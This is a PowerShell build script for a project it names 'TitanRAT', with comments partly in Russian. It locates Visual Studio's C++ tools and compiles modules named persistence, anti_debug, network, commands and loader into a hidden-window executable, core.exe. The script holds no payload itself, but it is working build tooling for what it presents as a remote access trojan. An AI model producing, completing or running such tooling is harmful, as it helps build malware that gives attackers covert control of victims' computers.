# Core/build.ps1 — ФИНАЛЬНАЯ ВЕРСИЯ С LOADER (ЗАМЕНИТЬ ЦЕЛИКОМ)
# build.ps1 — Авто-поиск VS и сборка

$ErrorActionPreference = "Stop"
Write-Host "[TitanRAT] Searching for Visual Studio..." -ForegroundColor Cyan

# 1. Находим путь к vcvarsall.bat через vswhere
$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
if (-not (Test-Path $vsWhere)) {
    Write-Host "[!] vswhere.exe not found. Install Visual Studio Build Tools or VS2019/2022." -ForegroundColor Red
    pause; exit 1
}

$vcVarsPath = & $vsWhere -latest -requires Microsoft.Component.MSBuild -find "VC\Auxiliary\Build\vcvars64.bat"
if (-not $vcVarsPath) {
    Write-Host "[!] Visual Studio C++ tools not found. Install 'Desktop development with C++' workload." -ForegroundColor Red
    pause; exit 1
}

Write-Host "[+] Found: $vcVarsPath"
Write-Host "[*] Initializing environment..."

# 2. Компиляция с loader.cpp и winhttp.lib
# /link отделяет флаги компилятора от флагов линкера
$cmd = "call `"$vcVarsPath`" && cl /nologo /EHsc /O2 main.cpp persistence.cpp anti_debug.cpp network.cpp commands.cpp loader.cpp /link /SUBSYSTEM:WINDOWS /OUT:core.exe kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib shlwapi.lib ws2_32.lib winhttp.lib && echo [+] Build successful: core.exe || echo [!] Compilation failed"

cmd /c $cmd

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Done. core.exe is ready." -ForegroundColor Green
} else {
    Write-Host "[!] Build failed." -ForegroundColor Red
}
pause